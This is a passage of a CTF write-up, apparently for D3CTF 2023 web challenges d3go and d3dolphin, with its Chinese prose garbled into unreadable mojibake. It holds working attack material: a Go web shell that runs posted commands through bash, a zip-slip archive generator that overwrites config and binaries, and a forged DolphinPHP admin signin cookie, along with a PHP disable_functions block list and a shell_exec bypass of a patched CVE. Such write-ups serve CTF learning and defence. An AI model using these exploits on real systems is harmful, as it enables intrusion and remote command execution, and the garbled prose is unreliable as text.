class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µå¯¹é™æ€æ–‡ä»¶åšäº†äº›å¤„ç†ï¼Œä»–ç›´æ¥å°±æ²¡å¯¹../è¿›è¡Œå¤„ç†ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ä»»æ„ç›®å½•ç©¿è¶Šï¼Œä¹Ÿå°±æ˜¯ä¸€å¼€å§‹æˆ‘ä»¬ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»å–å®Œåå†æ³¨æ„ä¸€ä¸‹controlleré‡Œçš„è¿™ä¸€æ®µ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">gorm.Model</span><br><span class="line">Username <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(20);not null;unique&quot; json:&quot;username&quot;`</span></span><br><span class="line">Password <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(100);not null&quot; json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹åº”çš„user.goå¦‚ä¸Šï¼Œæ˜¯ä¸€ä¸ªstructï¼Œä½†æ˜¯é‡Œé¢æœ‰ä¸€ä¸ªå­—æ®µéœ€è¦æ³¨æ„</p><p><img src="../images/image-20230507162913703.png" alt="image-20230507162913703"></p><p>ç»™äº† gorm.model å°±è¯´æ˜è‡ªå¸¦deletedatå­—æ®µï¼Œä¹Ÿå°±æ˜¯æœ‰è½¯åˆ é™¤è¿™ä¹ˆä¸€è¯´ï¼Œè½¯åˆ é™¤ä¹Ÿå°±æ˜¯éå®é™…åˆ é™¤æ•°æ®åº“æ•°æ®ï¼Œè€Œæ˜¯å•çº¯æ— æ³•æŸ¥è¯¢å‡ºæ¥ã€‚ç»“åˆä¸€ä¸‹ä¸Šé¢çš„æºç ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯ä»¥adminç™»å½•ç„¶åå»ä¸Šä¼ zipæ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬åº”è¯¥è½¯é“¾æ¥å…ˆåˆ é™¤ä¸€ä¸‹adminï¼š</p><p>è¿™é‡Œçš„è¯adminæ˜¯æ•°æ®åº“ä¸­çš„ç¬¬ä¸€ä¸ªç”¨æˆ·</p><p><img src="../images/image-20230507164038666.png" alt="image-20230507164038666"></p><p><img src="../images/image-20230507164030525.png" alt="image-20230507164030525"></p><p>ç„¶åå†åˆ›å»ºä¸€ä¸ªç”¨æˆ·</p><p><img src="../images/image-20230507164129892.png" alt="image-20230507164129892"></p><p>ä¹‹åç™»å½•testå°±æ˜¯ç®¡ç†å‘˜äº†ï¼Œå› ä¸ºä»£ç é‡Œçš„é€»è¾‘æ˜¯IDä¸º1çš„ç”¨æˆ·å°±æ˜¯ç®¡ç†å‘˜ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±å¥½è¯´äº†ï¼Œç”±é¢˜ç›®ä¸­config.goå’Œmain.goå¯ä»¥å¾—çŸ¥å®ç°äº†çƒ­éƒ¨ç½²</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¥½è¯´äº†ï¼Œæˆ‘ä»¬å¯ä»¥è¦†ç›–config.yamlå®ç°è‡ªæ›´æ–°ï¼Œä»¥ä¸‹æ˜¯chatgpté—®ç­”</p><p><a href="https://boogipop.com/2023/05/06/D3CTF%20x%20AntCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/#d3go">å‚è€ƒboogipopå¸ˆå‚…çš„</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">overseer.Run(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">&quot;/shell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">output, err := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, c.PostForm(<span class="string">&quot;cmd&quot;</span>)).CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(output))</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err := r.RunListener(state.Listener); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯æ¶æ„çš„goæ–‡ä»¶ï¼ŒæŠŠä»–ç¼–è¯‘ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶åï¼Œè¿˜éœ€è¦å‡†å¤‡ä¸€ä¸ªyamlæ–‡ä»¶</p><p>ä¸‹é¢è¿™ä¸ªæ˜¯åŸæœ¬çš„config.yamlæ–‡ä»¶</p><p><img src="../images/image-20230507164810114.png" alt="image-20230507164810114"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  noAdminLogin: <span class="literal">true</span></span><br><span class="line">database:</span><br><span class="line">  user: root</span><br><span class="line">  password: root</span><br><span class="line">  host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  port: <span class="number">3306</span></span><br><span class="line">update:</span><br><span class="line">  enabled: <span class="literal">true</span></span><br><span class="line">  url: http:<span class="comment">//127.0.0.1:8080/unzipped/shell</span></span><br><span class="line">  interval: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ä¹‹ååˆ©ç”¨zipslipå»è¦†ç›–æ–‡ä»¶ï¼Œå› ä¸ºé¢˜ç›®å¹¶æ²¡æœ‰å¯¹unzipåšå¤„ç†ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¦†ç›–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;exp.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##ç”Ÿæˆçš„zipæ–‡ä»¶</span></span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;exp.zip&quot;</span>)</span><br><span class="line">        zipFile.write(<span class="string">&quot;E:\\CTFLearning\\d3ctf\\d3go\\trueexp\\shell\\config.yaml&quot;</span>, <span class="string">&quot;../../config.yaml&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##å‹ç¼©çš„æ–‡ä»¶å’Œåœ¨zipä¸­æ˜¾ç¤ºçš„æ–‡ä»¶å</span></span><br><span class="line">        zipFile.write(<span class="string">&quot;./shell&quot;</span>, <span class="string">&quot;../shell&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##å‹ç¼©çš„æ–‡ä»¶å’Œåœ¨zipä¸­æ˜¾ç¤ºçš„æ–‡ä»¶å</span></span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>ç„¶åå°†ç”Ÿæˆçš„æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šå°±å¯ä»¥æˆåŠŸrceäº†</p><h2 id="d3dolphin"><a href="#d3dolphin" class="headerlink" title="d3dolphin"></a>d3dolphin</h2><p><strong>æç¤ºï¼š</strong></p><p><strong>æ²¡æœ‰å¿…è¦è›®åŠ›ã€‚ç®¡ç†å‘˜è‡ªä»ä»–å†™æ—¥å¿—åå°±å†ä¹Ÿæ²¡æœ‰å‡ºç°è¿‡ã€‚</strong></p><p><strong>ç®¡ç†å‘˜é€šè¿‡ç®€å•åœ°æŒ‰ç…§ <a href="https://github.com/ssteveez/dolphin/blob/main/README.md">https://github.com/ssteveez/dolphin/blob/main/README.md</a> æ‰€è¯´çš„å†…å®¹æ¥ä¿®è¡¥é”™è¯¯</strong></p><p>é¢˜ç›®</p><p><img src="../images/image-20230505201032755.png" alt="image-20230505201032755"></p><p><img src="../images/image-20230505201049807.png" alt="image-20230505201049807"></p><p>ç»™äº†ä¸ªCVE   ç„¶åå‘Šè¯‰ä½ è¿™é‡Œä½¿ç”¨äº†è¡¥ä¸æ¥ä¿®å¤è¿™ä¸ªCVE</p><p>signin_token å¯ä»¥å¾ˆå®¹æ˜“åœ°é€šè¿‡æä¾›â½¤â¼¾åã€id å’Œâ½¤â¼¾ [last_login_time] æ¥æš´â¼’ç ´è§£</p><p><strong>å› ä¸ºadminçš„ç”¨æˆ·å¯†ç ä¸çŸ¥é“ï¼Œäºæ˜¯å°±å»ä¸‹è½½æºç æ¥è¿›è¡ŒæŸ¥çœ‹</strong></p><p><img src="../images/image-20230505211453158.png" alt="image-20230505211453158"></p><p>å‘ç°ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;is_signin&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­æ˜¯å¦ç™»å½•</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> è”¡ä¼Ÿæ˜ &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">is_signin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$user</span>)) &#123;</span><br><span class="line">            <span class="comment">// åˆ¤æ–­æ˜¯å¦è®°ä½ç™»å½•</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?uid&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?signin_token&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$UserModel</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$UserModel</span>::<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;uid&#x27;</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">                    <span class="variable">$signin_token</span> = <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;last_login_time&#x27;</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;signin_token&#x27;</span>) == <span class="variable">$signin_token</span>) &#123;</span><br><span class="line">                        <span class="comment">// è‡ªåŠ¨ç™»å½•</span></span><br><span class="line">                        <span class="variable">$UserModel</span>-&gt;<span class="title function_ invoke__">autoLogin</span>(<span class="variable">$user</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth_sign&#x27;</span>) == <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>) ? <span class="variable">$user</span>[<span class="string">&#x27;uid&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ ¹æ®log.txtï¼Œadminçš„last_login_timeæ˜¯2011-04-05 14:19:19ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥â½£æˆâ¼€ä¸ªsigning_tokenï¼š</p><p>è¿™é‡Œéœ€è¦çš„æ˜¯æ—¶é—´æˆ³  æ‰€ä»¥<strong>2011-04-05 14:19:19</strong>çš„æ—¶é—´æˆ³ä¸º1301984359</p><p><img src="../images/image-20230505211707879.png" alt="image-20230505211707879"></p><p>ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;data_auth_sign&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ•°æ®ç­¾åè®¤è¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data è¢«è®¤è¯çš„æ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> è”¡ä¼Ÿæ˜ &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">data_auth_sign</span>(<span class="params"><span class="variable">$data</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// æ•°æ®ç±»å‹æ£€æµ‹</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="variable">$data</span> = (<span class="keyword">array</span>)<span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ’åº</span></span><br><span class="line">        <span class="title function_ invoke__">ksort</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// urlç¼–ç å¹¶ç”Ÿæˆqueryå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// ç”Ÿæˆç­¾å</span></span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sign</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥è¿›è¡Œç­¾åçš„ä¼ªé€ äº†</p><p><img src="../images/image-20230505214149350.png" alt="image-20230505214149350"></p><p>è¿™é‡Œä¸ºäº†é¿å…idå’Œæ—¶é—´æˆ³çš„æ··æ·†ï¼Œäºæ˜¯è¿™é‡Œå°±å¯ä»¥ä½¿ç”¨åˆ†+å·æ¥è¿›è¡Œåˆ†å‰²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;0=admin1&quot;</span> . <span class="string">&quot;1301984359&quot;</span>;  <span class="comment">// è¦è®¡ç®— SHA-1 å“ˆå¸Œçš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="variable">$h</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$s</span>);  <span class="comment">// è®¡ç®— SHA-1 å“ˆå¸Œå€¼</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$h</span>;  <span class="comment">// è¾“å‡ºï¼šab5f486a24426d9158c99507da45ae3bac476dd6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆcookieåï¼Œå°±å¯ä»¥è¿›è¡Œä¼ªé€ ç™»å½•äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie: </span><br><span class="line">dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505214607572.png" alt="image-20230505214607572"></p><p>å› ä¸ºè¿™é‡Œå­˜åœ¨é€šé…ç¬¦ï¼Œäºæ˜¯åå­—å°±å¯ä»¥è¿™æ ·å–</p><p><img src="../images/image-20230505214838155.png" alt="image-20230505214838155"></p><p>æ·»åŠ cookieåå°±å¯ä»¥æˆåŠŸè¿›è¡Œç™»å½•äº†</p><p>è¿™é‡Œçš„ç‰ˆæœ¬æ˜¯v1.5.1ï¼Œäºæ˜¯å¯ä»¥å»æŸ¥çœ‹ä¸Šä¸€ä¸ªç‰ˆæœ¬çš„æ¼æ´ï¼Œçœ‹è¿™ä¸ªç‰ˆæœ¬ä¿®å¤äº†å•¥ï¼Œç„¶ååœ¨é€šè¿‡çœ‹å®˜æ–¹çš„ä¿®å¤æœ‰æ²¡æœ‰æ¼æ´ï¼Œæˆ‘ä»¬å¯ä¸å¯ä»¥è¿›è¡Œç»•è¿‡</p><p>æ ¹æ®<a href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ï¼ŒDolphinphp v1.5.0å­˜åœ¨RCEæ¼æ´ï¼Œä½œè€…é€šè¿‡ç®€ å•æ·»åŠ å‡½æ•°â¿Šåå•çš„â½…å¼å¯¹å…¶è¿›â¾äº†ä¿®è¡¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | æµ·è±šPHPæ¡†æ¶ [ DolphinPHP ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | ç‰ˆæƒæ‰€æœ‰ 2016~2019 å¹¿ä¸œå“é”è½¯ä»¶æœ‰é™å…¬å¸ [ http://www.zrthink.com ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | å®˜æ–¹ç½‘ç«™: http://dolphinphp.com</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// æ‹’ç»ieè®¿é—®</span></span><br><span class="line">    <span class="string">&#x27;deny_ie&#x27;</span>       =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// æ¨¡å—ç®¡ç†ä¸­ï¼Œä¸è¯»å–æ¨¡å—ä¿¡æ¯çš„ç›®å½•</span></span><br><span class="line">    <span class="string">&#x27;except_module&#x27;</span> =&gt; [<span class="string">&#x27;common&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;extra&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;install&#x27;</span>],</span><br><span class="line">    <span class="comment">// ç¦ç”¨å‡½æ•°</span></span><br><span class="line">    <span class="string">&#x27;disable_functions&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;passthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;exec&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;system&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chroot&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chgrp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_alter&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_restore&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dl&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;openlog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;syslog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;readlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;symlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popepassthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505215639032.png" alt="image-20230505215639032"></p><p>ç›´æ¥å»æŸ¥çœ‹å®˜æ–¹å‘å¸ƒçš„è¡¥ä¸å°±è¡Œäº†</p><p>CVE-2023-0935 æ˜¯ä½¿â½¤ shell_exec ç»•è¿‡ CVE-2021-46097 2. æ ¹æ®<a href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ï¼ŒDolphinphp v1.5.0å­˜åœ¨RCEæ¼æ´ï¼Œä½œè€…é€šè¿‡ç®€ å•æ·»åŠ å‡½æ•°â¿Šåå•çš„â½…å¼å¯¹å…¶è¿›â¾äº†ä¿®è¡¥ã€‚ ç„¶åä½¿â½¤ç™»å½•ç®¡ç†â»”â¼¾ åœ¨è¿™ä¸ªæŒ‘æˆ˜ä¸­ï¼Œshell_exec è¢«æ·»åŠ åˆ° system.php ä¸­çš„ disable_functionsï¼Œä»¥åŠ php.ini ä¸‹â¾¯çš„å…¶ä»–å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini</span><br><span 